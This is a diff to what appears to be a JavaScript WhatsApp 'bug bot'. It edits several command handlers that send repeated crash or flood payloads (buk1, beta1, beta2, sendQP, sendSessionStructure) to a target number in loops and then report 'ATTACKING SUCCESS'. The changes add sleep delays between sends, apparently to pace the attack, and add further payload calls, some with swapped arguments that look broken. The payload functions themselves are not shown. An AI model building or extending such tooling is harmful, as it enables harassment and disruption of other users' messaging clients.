@@ -2152,12 +2152,21 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
+await sleep(1500);
 await buk1(viper, target);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
+await sleep(1500);
 await beta2(viper, target)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
+await beta1(viper, target);
+await sleep(1500);
 await beta1(viper, target);
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
@@ -2187,13 +2196,22 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
+await sleep(1500);
+await buk1(target, viper);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
+await sleep(1500);
+await beta2(target, viper)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
 await beta1(viper, target);
+await sleep(1500);
+await beta1(target, viper); 
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2223,13 +2241,22 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
+await sleep(1500);
+await buk1(target, viper);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
+await sleep(1500);
+await beta2(target, viper)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
 await beta1(viper, target);
+await sleep(1500);
+await beta1(target, viper); 
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2292,13 +2319,22 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
+await sleep(1500);
+await buk1(target, viper);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
+await sleep(1500);
+await beta2(target, viper)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
 await beta1(viper, target);
+await sleep(1500);
+await beta1(target, viper); 
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
